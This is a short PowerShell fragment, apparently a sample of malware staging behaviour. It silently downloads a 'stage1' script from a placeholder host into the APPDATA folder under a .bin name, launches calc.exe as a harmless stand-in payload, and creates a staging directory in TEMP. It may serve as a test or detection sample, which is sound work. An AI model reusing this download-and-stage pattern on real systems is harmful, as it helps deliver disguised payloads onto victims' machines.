
curl.exe -s -L -o "$env:APPDATA\stage1.bin" 'http://example.net/stage1.ps1'
& 'calc.exe'
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
